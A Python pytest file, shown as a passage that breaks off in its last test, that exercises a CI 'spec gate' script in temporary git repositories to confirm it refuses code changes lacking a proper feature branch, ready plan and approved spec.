"""The spec gate refuses code that has no FEAT-ID branch, ready plan and approved spec.

Every test here RUNS scripts/gate/spec_gate.py inside a throwaway git
repository, the way the pre-commit hook (`--commit`) and the spec-gate
workflow (`--pr BASE HEAD`) run it: a real index, real commits, real
`git diff`. Nothing is stubbed. The script is byte-identical in solyra, so
this suite covers both repositories.

One test per Codex finding on stocks#1205 and solyra#72, named in its
docstring; a finding both repositories received is one test. Each was run
against the gate at 71a9bbce first and failed there for the reason its
finding gives.
"""
from __future__ import annotations

import ast
import concurrent.futures
import ctypes
import datetime
import errno
import hashlib
import importlib.util
import types
import json
import os
import re
import shutil
import subprocess
import tempfile
import sys
from collections.abc import Callable
from pathlib import Path

import pytest
import yaml

TODAY = datetime.date.today().isoformat()   # the head commit's date, which Last reviewed must equal

REPO = Path(__file__).resolve().parents[2]
GATE = REPO / "scripts/gate/spec_gate.py"
WORKFLOW = REPO / ".github/workflows/spec-gate.yml"
RENDERER_HERE = (REPO / "scripts/maintenance/doc_inventory.py").is_file()

CATALOG = "docs/product/02-FEATURE-CATALOG.md"
REQUIREMENTS = "docs/product/01-PRODUCT-REQUIREMENTS.md"
TRACEABILITY = "docs/product/12-PR-ISSUE-TRACEABILITY.md"
SPEC = "docs/superpowers/specs/2026-09-01-model-decisions.md"
PLAN = "docs/superpowers/plans/2026-09-01-model-decisions.md"
BRANCH = "feature/feat-model-001-model-decisions"
DONE = ["every model states its decision", "the registry test passes"]
CODE = {"lib/model.py": "DECISION = 'direction'\n"}
NOT_A_FEAT_BRANCH = "is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>"

SOURCE_REVIEW_PROTECTED = (
    "scripts/maintenance/doc_source_snapshot.py", "scripts/maintenance/docs_audit.py",
    "tests/scripts/test_doc_source_snapshot.py", "tests/scripts/test_docs_audit.py",
    "scripts/__init__.py", "scripts/maintenance/__init__.py", "scripts/gate/__init__.py",
    "tests/__init__.py", "tests/scripts/__init__.py", "tests/conftest.py", "tests/scripts/conftest.py",
    "scripts/maintenance/json.py", "scripts/maintenance/json/__init__.py", "scripts/json.py",
    "json.py", "signal.py", "json/__init__.py", "scripts.py", "tests.py",
    "json.pyc", "json/__init__.pyc", "json.so", "json.abi3.so",
    "yaml.py", "yaml/__init__.py", "pytest.py", "pytest/__init__.py",
    "scripts/maintenance/json.pyc", "scripts/maintenance/json.so", "tests/scripts/json.pyc",
)

CATALOG_TEXT = """\
# Feature Catalog

| ID | Area | Status | Last reviewed | PRs |
|---|---|---|---|---|
| [FEAT-MODEL-001](#feat-model-001) | Models | Production | unknown | none |
| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |

## Capability records

### FEAT-MODEL-001

- Status: Production

### FEAT-DATA-001

- Status: Production
"""

REQUIREMENTS_TEXT = """\
# Product Requirements

**REQ-MODEL-001:** Every model states the decision it produces.

**REQ-DATA-001:** A missing value is never a zero.
"""


def front(**fields) -> str:
    """A markdown file whose frontmatter is `fields`; a list renders as `  - item` lines."""
    lines = ["---"]
    for key, value in fields.items():
        if isinstance(value, list):
            lines.append(f"{key}:")
            lines += [f"  - {item}" for item in value]
        else:
            lines.append(f"{key}: {value}")
    return "\n".join(lines + ["---", "", "# Body", ""])


def spec(**over) -> str:
    return front(**{"feat_id": "FEAT-MODEL-001", "req_ids": "[REQ-MODEL-001]",
                    "done_when": DONE, "status": "approved", **over})


TASKS = "\n## Task 1: state every decision\nSpec: § Design. Advances done_when[0].\n- [ ] write the failing test\n- [ ] implement\n"


def plan(**over) -> str:
    return front(**{"feat_id": "FEAT-MODEL-001", "spec": SPEC, "branch": BRANCH,
                    "status": "ready", **over}) + TASKS


GATE_WF = ("name: spec-gate\non:\n  pull_request_target:\n    types: [opened, synchronize, reopened, edited, ready_for_review]\npermissions:\n  contents: read\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n"
           "      - uses: actions/checkout@v4\n        with:\n          ref: {REF}\n"
           "      - run: git fetch --no-tags origin \"$HEAD_SHA\"\n"
           "      - env:\n{ENV}        run: {A}\n      - run: {B}\n"
           "      - uses: actions/upload-artifact@v4\n        with:\n          name: proposed-spec-gate\n          path: ${{ runner.temp }}/proposed/\n"
           "  base-suite:\n    needs: gate\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    steps:\n"
           "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.base.sha }}\n          persist-credentials: false\n"
           "      - uses: actions/download-artifact@v4\n        with:\n          name: proposed-spec-gate\n          path: scripts/gate\n      - run: {C}\n")
VERDICT_ENV = {"BASE_SHA": "base.sha", "HEAD_SHA": "head.sha", "PR_HEAD_REF": "head.ref", "PR_BASE_REF": "base.ref",
               "PR_HEAD_REPO": "head.repo.full_name", "PR_NUMBER": "number", "PR_DRAFT": "draft", "PR_TITLE": "title", "PR_BODY": "body"}
GATE_WF = GATE_WF.replace("{ENV}", "".join(f"          {k}: ${{{{ github.event.pull_request.{v} }}}}\n" for k, v in VERDICT_ENV.items())
                          + "          PR_BASE_REPO: ${{ github.repository }}\n")
VERDICT_CMD = 'python3 scripts/gate/spec_gate.py --pr "$BASE_SHA" "$HEAD_SHA"'
EXPORT_CMD = 'git show "$HEAD_SHA:scripts/gate/spec_gate.py" > "$RUNNER_TEMP/proposed/spec_gate.py"'
SUITE_CMD = "python3 -m pytest tests/scripts/test_spec_gate.py -q"


def gate_workflow(ref: str = "${{ github.event.pull_request.base.sha }}", a: str = VERDICT_CMD, b: str = EXPORT_CMD, c: str = SUITE_CMD) -> str:
    return GATE_WF.replace("{REF}", ref).replace("{A}", a).replace("{B}", b).replace("{C}", c)


def body(ticked: bool = False, spec_path: str = SPEC, plan_path: str | None = PLAN) -> str:
    box = "x" if ticked else " "
    links = [f"Spec: {spec_path}"] + ([f"Plan: {plan_path}"] if plan_path else [])
    return "\n".join(links + [""] + [f"- [{box}] {item}" for item in DONE])


def _git(cwd: Path, *args: str, env: dict[str, str] | None = None) -> str:
    # Fixture records use the collection day; real test commits must use that
    # same day even when a long native suite crosses midnight. Explicit dates
    # supplied by an individual test still take precedence over these defaults.
    git_env = dict(os.environ)
    git_env.setdefault("GIT_AUTHOR_DATE", f"{TODAY}T12:00:00+00:00")
    git_env.setdefault("GIT_COMMITTER_DATE", f"{TODAY}T12:00:00+00:00")
    git_env.update(env or {})
    return subprocess.run(["git", *args], cwd=cwd, check=True, env=git_env,
                          capture_output=True, text=True).stdout.strip()


def write(repo: Path, path: str, text: str) -> None:
    p = repo / path
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text, encoding="utf-8")
    if path.startswith(".githooks/"):
        p.chmod(0o755)   # a hook is executable unless a test takes that away


def configure_fixture_git(root: Path) -> None:
    """Only Git's exact default local config can receive the fixed fixture settings directly."""
    default = (b"[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n"
               b"\tbare = false\n\tlogallrefupdates = true\n")
    try:
        if "GIT_CONFIG" in os.environ:
            eligible = False
        else:
            path = root / _git(root, "rev-parse", "--git-path", "config")
            eligible = (path == root / ".git/config" and not (root / ".git").is_symlink()
                        and not path.is_symlink() and path.is_file() and path.read_bytes() == default)
    except (OSError, subprocess.CalledProcessError):
        eligible = False
    if eligible:
        with path.open("ab") as stream:
            stream.write(b"[maintenance]\n\tautoDetach = false\n[gc]\n\tautoDetach = false\n"
                         b"[user]\n\temail = t@example.com\n\tname = t\n[commit]\n\tgpgsign = false\n")
        return
    # Unknown templates/layouts retain Git's overwrite, include and multivalue-error semantics.
    _git(root, "config", "maintenance.autoDetach", "false")
    _git(root, "config", "gc.autoDetach", "false")
    _git(root, "config", "user.email", "t@example.com")
    _git(root, "config", "user.name", "t")
    _git(root, "config", "commit.gpgsign", "false")


def make_repo(root: Path):
    """`main` holds the gate, a catalog, requirements, one approved spec and its
    ready plan, and one code file. Tag `base` marks it; every change branches
    from there."""
    _git(root, "init", "-q", "-b", "main")
    configure_fixture_git(root)
    write(root, "scripts/gate/spec_gate.py", GATE.read_text(encoding="utf-8"))
    write(root, CATALOG, CATALOG_TEXT)
    write(root, REQUIREMENTS, REQUIREMENTS_TEXT)
    write(root, SPEC, spec())
    write(root, PLAN, plan())
    write(root, "lib/model.py", "DECISION = 'size'\n")
    _git(root, "add", "-A")
    _git(root, "commit", "-q", "-m", "base")
    _git(root, "tag", "base")
    return root


@pytest.fixture
def repo(tmp_path):
    return make_repo(tmp_path)


def gate(repo: Path, *args: str, **env: str) -> subprocess.CompletedProcess:
    # Only what the hook and the workflow pass in: nothing leaks from the shell running pytest.
    # (stocks#1205 r4122021112: PYTEST_CURRENT_TEST would tell a gate it is under test)
    inherited = {k: v for k, v in os.environ.items() if not k.startswith(("PR_", "SPEC_GATE_", "GIT_", "PYTEST_"))}
    capacity_bridge_before_dispatch(args, env)   # capacity bridge: oracle and pair guard, a no-op outside its eight functions
    result = subprocess.run([sys.executable, "scripts/gate/spec_gate.py", *args], cwd=repo,
                          env={**inherited, **env}, capture_output=True, text=True)
    capacity_bridge_after_dispatch(result)
    return result


def cells(line: str) -> list[str]:
    return [c.strip() for c in line.strip().strip("|").split("|")]


def on_base(repo: Path, files: dict[str, str | None], then=None) -> None:
    """Commit `files` on main and move the `base` tag there: what a change is measured against.
    The catalog row and the approved spec are read from the base, never from the change."""
    _git(repo, "reset", "-q", "--hard")
    _git(repo, "clean", "-qfd")
    _git(repo, "checkout", "-q", "main")
    for path, text in files.items():
        if text is None:
            (repo / path).unlink()
        else:
            write(repo, path, text)
    if then is not None:
        then(repo)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "on base")
    _git(repo, "tag", "-f", "base")


def pr(repo: Path, branch: str, files: dict[str, str | None], then=None, **env: str) -> subprocess.CompletedProcess:
    """A pull request from `branch`, cut from base, that writes `files` (None deletes one),
    judged the way the spec-gate workflow judges it."""
    base, head = cut(repo, branch, files, then)
    return gate(repo, "--pr", base, head, **{"PR_HEAD_REF": branch, **env})


def pr_each(repo: Path, branch: str, files: dict[str, str | None], bodies, **env: str) -> list[subprocess.CompletedProcess]:
    """What pr() returns for each of `bodies` as PR_BODY, in order. The change is committed once and
    the gate only reads the repository, so the judgments run side by side: the registry job's 335 s
    bound (#1700)."""
    bodies = list(bodies)
    if _CAPACITY_BRIDGE["active"] is not None:   # the bridge pairs each dispatch with its own cut
        return [pr(repo, branch, files, **env, PR_BODY=body) for body in bodies]
    base, head = cut(repo, branch, files)
    judge = lambda body: gate(repo, "--pr", base, head, **{"PR_HEAD_REF": branch, **env, "PR_BODY": body})
    with concurrent.futures.ThreadPoolExecutor(max_workers=os.cpu_count() or 1) as pool:
        return list(pool.map(judge, bodies))


def pr_case(branch: str, files: dict[str, str | None], **env: str) -> tuple[str, dict[str, str | None], dict[str, str]]:
    """One case for prs(): what pr(repo, branch, files, **env) is given."""
    return branch, files, env


def prs(repo: Path, cases) -> list[subprocess.CompletedProcess]:
    """What pr() returns for each pr_case() case, in order. The last case is cut in `repo`, which ends as
    pr() leaves it; each other case in a copy of `repo` made first, removed after. The gate reads only its
    own copy, so the judgments run side by side: the registry job's 335 s bound (#1700)."""
    cases = list(cases)
    if _CAPACITY_BRIDGE["active"] is not None or len(cases) < 2:   # the bridge pairs each dispatch with its own cut
        return [pr(repo, branch, files, **env) for branch, files, env in cases]
    copies = []
    try:
        for _ in cases[:-1]:
            copies.append(Path(tempfile.mkdtemp(prefix=f"{repo.name}-case-", dir=repo.parent)) / "repo")
            shutil.copytree(repo, copies[-1], symlinks=True)
        heads = [(root, branch, env, cut(root, branch, files)) for root, (branch, files, env) in zip([*copies, repo], cases)]
        judge = lambda h: gate(h[0], "--pr", *h[3], **{"PR_HEAD_REF": h[1], **h[2]})
        with concurrent.futures.ThreadPoolExecutor(max_workers=os.cpu_count() or 1) as pool:
            return list(pool.map(judge, heads))
    finally:
        for root in copies:
            shutil.rmtree(root.parent, ignore_errors=True)


def each_pr(repo: Path, make, cases):
    """Each case with what pr() returns for the pr_case() `make` writes for it, judged side by side (prs)."""
    cases = list(cases)
    return zip(cases, prs(repo, [make(case) for case in cases]), strict=True)


def judged(judge, make, cases):
    """Each case with what `judge` (a batch of pr_each) returns for the body `make` writes for it."""
    cases = list(cases)
    return zip(cases, judge([make(case) for case in cases]), strict=True)


def cut(repo: Path, branch: str, files: dict[str, str | None], then=None) -> tuple[str, str]:
    """Cut `branch` from base, write `files` (None deletes one) and commit: the (base, head) the gate judges."""
    _git(repo, "reset", "-q", "--hard")
    _git(repo, "clean", "-qfd")
    _git(repo, "checkout", "-q", "-B", branch, "base")
    for path, text in files.items():
        if text is None:
            (repo / path).unlink()
        else:
            write(repo, path, text)
    if then is not None:
        then(repo)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", f"change on {branch}")
    if _CAPACITY_BRIDGE["active"] is not None:   # capacity bridge: the caller vector this case dispatches
        _CAPACITY_BRIDGE["vector"] = capacity_bridge_vector(branch, files)
    # (stocks#1205 r4127577496: Actions passes two 40-character shas, so the suite does too)
    return base_and_head(repo)


def test_fixture_commit_dates_survive_midnight_and_preserve_explicit_dates(repo, monkeypatch):
    fixture_day = (datetime.date.today() - datetime.timedelta(days=1)).isoformat()
    monkeypatch.setitem(globals(), "TODAY", fixture_day)
    meta = {"PR_TITLE": "FEAT-MODEL-001: midnight fixture", "PR_BODY": body(ticked=True),
            "PR_NUMBER": "42", "PR_DRAFT": "false"}
    recorded = {**CODE, PLAN: plan(pr=42)}
    row = CATALOG_TEXT.replace("| Models | Production | unknown | none |",
                               f"| Models | Production | {fixture_day} | #42 |")
    accepted = pr(repo, BRANCH, {**recorded, CATALOG: row}, **meta)
    assert accepted.returncode == 0, accepted.stdout + accepted.stderr
    assert _git(repo, "show", "-s", "--format=%as|%cs", "HEAD") == f"{fixture_day}|{fixture_day}"
    wrong_day = (datetime.date.fromisoformat(fixture_day) + datetime.timedelta(days=1)).isoformat()
    refused = pr(repo, BRANCH, {**recorded, CATALOG: row.replace(fixture_day, wrong_day)}, **meta)
    assert refused.returncode == 1 and "head commit date" in refused.stdout, refused.stdout
    assert fixture_day in refused.stdout and wrong_day in refused.stdout

    monkeypatch.setenv("GIT_AUTHOR_DATE", "2001-02-03T12:00:00+00:00")
    monkeypatch.setenv("GIT_COMMITTER_DATE", "2002-04-05T12:00:00+00:00")
    _git(repo, "commit", "-q", "--allow-empty", "-m", "explicit inherited fixture dates")
    assert _git(repo, "show", "-s", "--format=%as|%cs", "HEAD") == "2001-02-03|2002-04-05"
    _git(repo, "commit", "-q", "--allow-empty", "-m", "explicit per-call fixture dates",
         env={"GIT_AUTHOR_DATE": "2003-06-07T12:00:00+00:00",
              "GIT_COMMITTER_DATE": "2004-08-09T12:00:00+00:00"})
    assert _git(repo, "show", "-s", "--format=%as|%cs", "HEAD") == "2003-06-07|2004-08-09"


def test_the_gate_cannot_be_edited_outside_chore_and_ci_runs_the_base_copy(repo):
    """stocks#1205 r4116983555 (spec_gate.py:116, P1); solyra#72 r4117710094 (:116).

    The old gate left scripts/gate/ ungated on every branch and CI ran the PR's
    own copy, so a PR could swap the gate for a no-op. The gate's files are code
    now, allowed only on chore/, and CI runs the copy on the base branch.
    """
    edit = {"scripts/gate/spec_gate.py": GATE.read_text(encoding="utf-8") + "# tweak\n"}
    r = pr(repo, "tweak-gate", edit)
    assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, r.stdout
    assert pr(repo, "chore/gate-fix", edit).returncode == 0

    workflow = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
    # One trigger; the head-executing registry check is its own workflow, so a run never
    # creates a skipped twin of the other's job (stocks#1205 r4118475509, P1). The second
    # job here runs the base's suite against the proposed gate, after the verdict.
    assert list(workflow.get("on", workflow.get(True))) == ["pull_request_target"]
    assert list(workflow["jobs"]) == ["gate", "base-suite"]
    for job in workflow["jobs"].values():
        checkout = next(s for s in job["steps"] if s.get("uses", "").startswith("actions/checkout"))
        assert checkout["with"]["ref"] == "${{ github.event.pull_request.base.sha }}"
        assert not any("python3 scripts/gate/export_model_registry.py" in s.get("run", "") for s in job["steps"])


def test_source_review_inputs_and_startup_dependencies_belong_to_cicd(repo):
    """The actual gate refuses unrelated-feature edits, including new shadow slots."""
    catalog = CATALOG_TEXT.replace("| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |",
                                   "| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |\n| FEAT-CICD-001 | Delivery | Production | unknown | none |")
    on_base(repo, {CATALOG: catalog})
    for path in SOURCE_REVIEW_PROTECTED:
        refused = pr(repo, BRANCH, {path: "LOCAL = 'benign ownership control'\n"},
                     PR_TITLE="FEAT-MODEL-001: local source review ownership", PR_DRAFT="true")
        assert refused.returncode == 1 and "belong to FEAT-CICD-001" in refused.stdout, (path, refused.stdout)


def test_source_review_input_legitimate_cicd_change_passes_actual_gate(repo):
    branch = "feature/feat-cicd-001-source-review-inputs"
    cicd_spec = SPEC.replace("model-decisions", "source-review-inputs")
    cicd_plan = PLAN.replace("model-decisions", "source-review-inputs")
    on_base(repo, {
        CATALOG: CATALOG_TEXT.replace("| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |",
                                     "| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |\n| FEAT-CICD-001 | Delivery | Production | unknown | none |"),
        cicd_spec: spec(feat_id="FEAT-CICD-001"),
    })
    accepted = pr(repo, branch, {cicd_plan: plan(feat_id="FEAT-CICD-001", branch=branch, spec=cicd_spec),
                                "scripts/maintenance/doc_source_snapshot.py": "LOCAL = 'benign CICD-owned control'\n"},
                  PR_TITLE="FEAT-CICD-001: source review input ownership", PR_DRAFT="true")
    assert accepted.returncode == 0, accepted.stdout + accepted.stderr


def test_deploy_and_config_files_are_gated(repo):
    """stocks#1205 r4116983558 (spec_gate.py:33, P1).

    The old gate looked only under lib/ gcp/ platform/ scripts/ src/, so a
    Dockerfile, a deploy workflow or a dependency manifest passed on any branch.
    Everything but documentation is gated; chore/ may touch manifests only.
    """
    ops = {"Dockerfile": "FROM python:3.12\n",
           "docker-compose.yml": "services: {}\n",
           ".github/workflows/deploy-staging.yml": "name: deploy\n"}
    r = pr(repo, "tweak-deploy", ops)
    assert r.returncode == 1 and "changes 3 gated file(s)" in r.stdout, r.stdout
    assert pr(repo, "chore/deploy", ops).returncode == 1
    manifest = {"requirements.txt": "requests==2.32.3\n"}
    assert pr(repo, "tweak-deps", manifest).returncode == 1
    # (red-team round three: a requirements file CI installs from is bumped on chore/, never created there)
    r = pr(repo, "chore/bump-requests", manifest)
    assert r.returncode == 1 and "a new requirements file" in r.stdout, r.stdout
    on_base(repo, {"requirements.txt": "requests==2.32.2\n"})
    assert pr(repo, "chore/bump-requests", manifest).returncode == 0
    on_base(repo, {"requirements.txt": None})


def test_root_entry_points_and_public_assets_are_gated(repo):
    """solyra#72 r4116980734 (spec_gate.py:32, P1).

    vite.config.ts, index.html and public/ change what the app builds and
    serves; the old gate looked only under src/.
    """
    r = pr(repo, "tweak-shell", {"vite.config.ts": "export default {}\n",
                                 "index.html": "<!doctype html>\n",
                                 "public/robots.txt": "User-agent: *\n"})
    assert r.returncode == 1 and "changes 3 gated file(s)" in r.stdout, r.stdout


def test_branch_names_exempt_no_code(repo):
    """stocks#1205 r4117017697 (spec_gate.py:137, P1); solyra#72 r4117710091 (:137, P1).

    The old gate returned before reading the diff on main, docs/, chore/ and
    spike/ branches, and a fork's PR from its own `main` arrives named `main`.
    A prefix now only lets a same-repository PR touch manifests, the gate's
    files, or the vendored skills; a fork's PR gets no allowance at all.
    """
    fork = {"PR_HEAD_REPO": "someone/stocks", "PR_BASE_REPO": "TeneikaAskew/stocks"}
    code = {**CODE, "src/App.tsx": "export {}\n"}
    runs = {name: pr(repo, name, code, **env)
            for name, env in (("main", fork), ("docs/typo", {}), ("chore/bypass", {}), ("spike/try", {}))}
    assert all(r.returncode == 1 for r in runs.values()), {n: r.stdout for n, r in runs.items()}
    assert "A pull request from a fork gets no prefix allowance." in runs["main"].stdout
    manifest = {"package-lock.json": "{}\n"}   # a new package.json is a new project, see the dependency-fields test
    assert pr(repo, "chore/deps", manifest).returncode == 0
    assert pr(repo, "chore/deps", manifest, **fork).returncode == 1


def test_the_branch_is_feature_or_fix_with_the_feat_id_first(repo):
    """stocks#1205 r4116983566 (spec_gate.py:146); solyra#72 r4116980730 (:141).

    The old gate searched the whole branch name for a FEAT-ID, so
    `release-FEAT-MODEL-001-temp` passed once a plan named it.
    """
    for name, r in each_pr(repo, lambda name: pr_case(name, {**CODE, PLAN: plan(branch=name)}), ("release-FEAT-MODEL-001-temp", "experiment-feat-model-001-x", "feature/x-feat-model-001")):
        assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, (name, r.stdout)
    assert pr(repo, BRANCH, CODE).returncode == 0


def test_a_superseded_spec_authorizes_nothing(repo):
    """stocks#1205 r4116983561 (spec_gate.py:155).

    The old gate took the newest APPROVED spec for the FEAT-ID, skipping a newer
    draft that replaces it, so the stale approval authorized the change. The
    spec is the one the plan names, and it fails once another spec supersedes
    it or it is marked superseded.
    """
    newer = "docs/superpowers/specs/2026-09-20-model-decisions-v2.md"
    on_base(repo, {newer: spec(supersedes=SPEC)})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and f"{SPEC} is superseded by {newer}" in r.stdout, r.stdout
    # solyra#72 r4118481058: a draft, or another feature's spec, naming this one does not replace it
    on_base(repo, {newer: spec(status="draft", supersedes=SPEC)})
    assert pr(repo, BRANCH, CODE).returncode == 0
    on_base(repo, {newer: spec(feat_id="FEAT-DATA-001", req_ids="[REQ-DATA-001]", supersedes=SPEC)})
    assert pr(repo, BRANCH, CODE).returncode == 0
    on_base(repo, {SPEC: spec(status="superseded")})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and "is status: superseded" in r.stdout, r.stdout


def test_the_plan_names_the_spec_that_is_enforced(repo):
    """stocks#1205 r4116983576 (spec_gate.py:111); solyra#72 r4116980726 (:151, P1).

    The old gate found an approved spec by FEAT-ID on its own and only checked
    that the plan's `spec:` path existed, so a plan could point at another
    feature's spec, or at a newer draft, and still pass.
    """
    other = "docs/superpowers/specs/2026-09-02-data-nulls.md"
    draft = "docs/superpowers/specs/2026-09-20-model-decisions-v2.md"
    on_base(repo, {other: spec(feat_id="FEAT-DATA-001", req_ids="[REQ-DATA-001]"), draft: spec(status="draft")})
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(spec=other)})
    assert r.returncode == 1 and "the plan's spec serves FEAT-DATA-001, not FEAT-MODEL-001" in r.stdout, r.stdout
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(spec=draft)})
    assert r.returncode == 1 and f"{draft} is still status: draft" in r.stdout, r.stdout


def test_only_a_ready_plan_authorizes_code(repo):
    """stocks#1205 r4117017702 (spec_gate.py:108).

    The old gate required a `status` key and never read its value, so a draft
    plan, or a done one reused on a recreated branch, authorized code.
    """
    runs = {s: pr(repo, BRANCH, {**CODE, PLAN: plan(status=s)}) for s in ("draft", "done", "whatever")}
    assert all(r.returncode == 1 for r in runs.values()), {s: r.stdout for s, r in runs.items()}
    assert "authorizes implementation only while status: ready" in runs["done"].stdout
    assert "status must be ready | done" in runs["whatever"].stdout


def test_the_plan_is_the_one_naming_this_branch(repo):
    """stocks#1205 r4117017705 (spec_gate.py:160).

    The old gate took the newest plan for the FEAT-ID and refused every other
    branch, so two changes under one FEAT-ID could not run side by side. The
    plan is the one whose `branch:` is this branch, and it must be the only one.
    """
    second = "docs/superpowers/plans/2026-09-05-model-decisions-docs.md"
    on_base(repo, {second: plan(branch="feature/feat-model-001-other")})   # another branch's plan, on the base
    assert pr(repo, BRANCH, CODE).returncode == 0
    on_base(repo, {second: plan()})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and "one plan = one branch" in r.stdout, r.stdout


def test_done_when_and_the_other_list_fields_must_be_lists(repo):
    """stocks#1205 r4116983587 (spec_gate.py:102); solyra#72 r4116980740 (:102).

    The old gate checked emptiness only when done_when parsed as a list, so
    `done_when: TBD` or `done_when: ""` authorized code with nothing to
    verify. issues and canvases get the same type check.
    """
    for value in ("TBD", '""'):
        on_base(repo, {SPEC: spec(done_when=value)})
        r = pr(repo, BRANCH, CODE)
        assert r.returncode == 1 and "done_when must be a non-empty list" in r.stdout, (value, r.stdout)
    on_base(repo, {SPEC: spec(issues="#12")})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and "issues must be a list" in r.stdout, r.stdout


def test_req_ids_name_defined_requirements(repo):
    """stocks#1205 r4117591702 (spec_gate.py:98).

    The old gate never read req_ids. Each must be shaped REQ-XXX-000 and, where
    the requirements doc defines IDs (stocks), be one of them. Solyra has no
    requirements doc, so there the check is shape only.
    """
    on_base(repo, {SPEC: spec(req_ids="[REQ-FAKE-999]")})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and "req_ids not defined in" in r.stdout, r.stdout
    on_base(repo, {SPEC: spec(req_ids="[REQ-DOES-NOT-EXIST-999]")})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and "not shaped REQ-XXX-000" in r.stdout, r.stdout
    on_base(repo, {SPEC: spec(req_ids="[]")})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and "req_ids must be a non-empty list" in r.stdout, r.stdout
    # stocks#1205 r4119001312: a definition inside a comment or a fence is retired, not live
    hidden = REQUIREMENTS_TEXT + "\n<!-- **REQ-FAKE-999:** retired -->\n\n```\n**REQ-FAKE-998:** example\n```\n"
    on_base(repo, {SPEC: spec(req_ids="[REQ-FAKE-999]"), REQUIREMENTS: hidden})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and "req_ids not defined in" in r.stdout, r.stdout
    on_base(repo, {SPEC: spec(req_ids="[REQ-FAKE-999]"), REQUIREMENTS: None})
    assert pr(repo, BRANCH, CODE).returncode == 0
    # stocks#1205 r4118721673: a registry that exists but defines no IDs fails closed,
    # instead of silently accepting every shaped ID
    on_base(repo, {REQUIREMENTS: "# Requirements\n\nrewritten as prose, no bold REQ definitions\n\n"})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and "defines no REQ-IDs" in r.stdout, r.stdout


def test_commit_mode_reads_what_is_staged(repo):
    """stocks#1205 r4117017699 (spec_gate.py:85); solyra#72 r4117710096 (:179).

    The old gate listed the staged files but read specs and plans from the
    working tree, so a plan staged as done and flipped to ready on disk
    passed, although the commit carries the done one.
    """
    _git(repo, "checkout", "-q", "-B", BRANCH, "base")
    write(repo, PLAN, plan(status="done"))
    write(repo, "lib/model.py", CODE["lib/model.py"])
    _git(repo, "add", PLAN, "lib/model.py")
    write(repo, PLAN, plan())
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "authorizes implementation only while status: ready" in r.stdout, r.stdout
    _git(repo, "add", PLAN)
    assert gate(repo, "--commit").returncode == 0


def test_commit_mode_freezes_a_spec_once_main_holds_it_approved(repo):
    """A spec approved by an earlier commit on its own docs/ branch, not yet on main, was refused any further
    edit by the pre-commit check, which compared it with HEAD; the PR, measured against main, allows it.
    Commit mode now freezes a spec once any remote's main or main holds it approved or superseded, read by their
    exact full ref names, along with what a merge on the branch brought in; an unreadable main freezes it; a move to
    superseded stays checked; without a main that shares its history it compares with HEAD."""
    newer = "docs/superpowers/specs/2026-09-02-model-decisions-v2.md"
    _git(repo, "checkout", "-q", "-B", "docs/spec-feat-model-001-v2", "base")
    # a remote branch named with a line separator git allows is one ref, not a crash, and a remote whose name is too
    # long for a file name is no main rather than a crash (red-team, this PR)
    _git(repo, "update-ref", "refs/remotes/origin/fix\u2028notes\u0085more", "base")
    _git(repo, "remote", "add", "r" * 300, "https://example.invalid/x.git")
    # nor is a supersedes with a NUL in it, in an earlier commit's copy of a draft (red-team, this PR)
    odd = "docs/superpowers/specs/2026-09-03-draft-notes.md"
    write(repo, odd, spec(status="draft", supersedes="docs/superpowers/specs/x\x00.md"))
    _git(repo, "add", odd)
    _git(repo, "commit", "-q", "--no-verify", "-m", "a draft committed past the hook")
    write(repo, odd, spec(status="draft", supersedes="null"))
    _git(repo, "add", odd)
    r = gate(repo, "--commit")
    assert r.returncode == 0, r.stdout + r.stderr
    _git(repo, "reset", "-q", "--hard", "HEAD^1")
    write(repo, newer, spec(done_when=["first wording"]))
    _git(repo, "add", newer)
    assert gate(repo, "--commit").returncode == 0
    _git(repo, "commit", "-q", "-m", "approve v2")
    write(repo, newer, spec(done_when=["revised in review"]))
    _git(repo, "add", newer)
    r = gate(repo, "--commit")
    assert r.returncode == 0, r.stdout
    _git(repo, "commit", "-q", "-m", "revise v2")
    # a move to superseded with no approved replacement is still refused, as CI refuses it (red-team, this PR)
    write(repo, newer, spec(status="superseded", done_when=["revised in review"]))
    _git(repo, "add", newer)
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "names it in `supersedes`" in r.stdout, r.stdout
    _git(repo, "reset", "-q", "HEAD", "--", newer)
    _git(repo, "checkout", "-q", "--", newer)
    # a replacement that has superseded its target keeps naming it, as CI requires (red-team, this PR)
    write(repo, newer, spec(supersedes=SPEC, done_when=["revised in review"]))
    write(repo, SPEC, spec(status="superseded"))
    _git(repo, "add", newer, SPEC)
    r = gate(repo, "--commit")
    assert r.returncode == 0, r.stdout
    _git(repo, "commit", "-q", "-m", "v2 supersedes the original")
    write(repo, newer, spec(done_when=["revised in review"]))
    _git(repo, "add", newer)
    r = gate(repo, "--commit")
    assert r.returncode == 1 and f"{newer}: an approved spec does not change in place" in r.stdout, r.stdout
    _git(repo, "reset", "-q", "--hard", "HEAD^1")
    # the spec main holds approved is still frozen in commit mode
    write(repo, SPEC, spec(done_when=["something easier"]))
